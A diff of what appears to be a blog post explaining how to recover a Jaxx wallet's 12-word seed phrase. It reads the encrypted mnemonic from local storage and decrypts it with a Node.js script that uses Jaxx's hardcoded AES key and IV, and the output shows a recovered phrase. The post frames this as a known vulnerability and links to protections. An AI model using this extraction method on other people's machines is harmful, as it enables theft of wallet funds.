@@ -38,7 +38,7 @@ from ItemTable
 where key="mnemonic";
 ```
 <br>
-This should return a long string which is the encrypted 12-word phrase. If you can’t find the Local Storage folder or are having trouble retrieving the mnemonic, you can install the <a class="link" href="https://chrome.google.com/webstore/detail/storage-area-explorer/ocfjjjjhkpapocigimmppepjgfdecjkb?hl=en" target="_blank">Storage Area Explorer</a> extension in Google Chrome. Right click on the Jaxx wallet and select “Inspect Pop-up”. Navigate to the “Storage Explorer” tab and choose window.localStorage. You can copy the mnemonic from the array of data there. Alternatively you can simply type, <span class="code">window.localStorage.mnemonic</span> in the Chrome console.
+This should return a long string which is the encrypted 12-word phrase. If you can't find the Local Storage folder or are having trouble retrieving the mnemonic, you can install the <a class="link" href="https://chrome.google.com/webstore/detail/storage-area-explorer/ocfjjjjhkpapocigimmppepjgfdecjkb?hl=en" target="_blank">Storage Area Explorer</a> extension in Google Chrome. Right click on the Jaxx wallet and select "Inspect Pop-up". Navigate to the "Storage Explorer" tab and choose window.localStorage. You can copy the mnemonic from the array of data there. Alternatively you can simply type, `window.localStorage.mnemonic` in the Chrome console.
 <br><br>
 
 ```bash
@@ -50,42 +50,47 @@ This should return a long string which is the encrypted 12-word phrase. If you c
   A06dx9+qAkYd4Gk4K60//HGf
 ```
 <br><br>
-Note down the returned value for the next step. Using the following code, we will substitute our value from above into the mnemonicEncrypted value. Before executing this script, ensure you have Node.js and Crypto-js installed: <span class="code">npm install crypto-js@3.1.2</span>.
+Note down the returned value for the next step. Using the following code, we will substitute our value from above into the mnemonicEncrypted value. Before executing this script, ensure you have Node.js and Crypto-js installed: `npm install crypto-js@3.1.2`.
 <br><br>
 Save the file below as <i>generateSeedPhrase.js</i> and then execute it in the Node.js runtime.
 <br><br>
-<p class="code">
-    /* <br>Jaxx recovery phrase extraction by<br> cpbotha@vxlabs.com 2017<br>
-    vxlabs.com/2017/06/10/extracting-the-jaxx-12-word-wallet-backup-phrase/<br>
-    You need v3.1.2 (same as latest jaxx) else you'll get invalid UTF-8 error<br>
-    */<br>
-    var CryptoJS = require('crypto-js');<br>
-    var _key = "6Le0DgMTAAAAANokdfEial";<br>
-    var _iv  = "mHGFxENnZLbienLyALoi.e";<br><br>
+```javascript
+/* 
+Jaxx recovery phrase extraction by
+cpbotha@vxlabs.com 2017
+vxlabs.com/2017/06/10/extracting-the-jaxx-12-word-wallet-backup-phrase/
+You need v3.1.2 (same as latest jaxx) else you'll get invalid UTF-8 error
+*/
+var CryptoJS = require('crypto-js');
+var _key = "6Le0DgMTAAAAANokdfEial";
+var _iv  = "mHGFxENnZLbienLyALoi.e";
 
-    var mnemonicEncrypted=<br>"<span style="color: red">
-    fotQ+ffgUXP59/qBVR6h5pXFw61NMU<br>
-    opq6rkXI6DrMw22Bu60P3VfTceDkDB<br>paO0yffFiUqdgcWDHHmUFMoPy9Fj1D<br>DgCYwjZcD1pL/HA06dx9+qAkYd4Gk4K60//HGf</span>";<br><br>
-    var _keyB;<br>
-    var _ivB;<br><br>
+var mnemonicEncrypted=
+"fotQ+ffgUXP59/qBVR6h5pXFw61NMU
+opq6rkXI6DrMw22Bu60P3VfTceDkDB
+paO0yffFiUqdgcWDHHmUFMoPy9Fj1D
+DgCYwjZcD1pL/HA06dx9+qAkYd4Gk4K60//HGf";
 
-    // js/vault/vault.js<br>
-    function decryptSimple(encryptedTxt) {<br>
-        <span style="margin-left: 40px">_keyB = CryptoJS.enc.Base64.parse(_key);</span><br>
-        <span style="margin-left: 40px">_ivB = CryptoJS.enc.Base64.parse(_iv);</span><br>   
-        <span style="margin-left: 40px">var decrypted = CryptoJS.AES.decrypt(encryptedTxt, _keyB, { iv: _ivB });</span><br>
-        <span style="margin-left: 40px">var decryptedText = decrypted.toString(CryptoJS.enc.Utf8);</span><br>
-        <span style="margin-left: 40px">return decryptedText;</span><br>
-    }<br><br>
+var _keyB;
+var _ivB;
 
-    console.log(decryptSimple(mnemonicEncrypted));<br>
-</p><br><br>
+// js/vault/vault.js
+function decryptSimple(encryptedTxt) {
+    _keyB = CryptoJS.enc.Base64.parse(_key);
+    _ivB = CryptoJS.enc.Base64.parse(_iv);   
+    var decrypted = CryptoJS.AES.decrypt(encryptedTxt, _keyB, { iv: _ivB });
+    var decryptedText = decrypted.toString(CryptoJS.enc.Utf8);
+    return decryptedText;
+}
+
+console.log(decryptSimple(mnemonicEncrypted));
+```<br><br>
 To run it refer to image below. Note that we've retrieved the 12-word phrase which will give us access to the Jaxx wallet, <i>'ghost marble error capable seminar around multiply owner click amused prevent fee'</i>. There are ways to protect yourself from this vulnerability which are discussed further <a class="link" href="https://vxlabs.com/2017/06/10/extracting-the-jaxx-12-word-wallet-backup-phrase/" target="_blank">here</a>.<br><br>
 
-<p class="code">
-    > node generateSeedPhrase.js <br>
-    > ghost marble error capable seminar around multiply owner click amused prevent fee
-</p>
+```bash
+> node generateSeedPhrase.js 
+> ghost marble error capable seminar around multiply owner click amused prevent fee
+```
 <br><br>
 Thanks,<br>
 Blaine
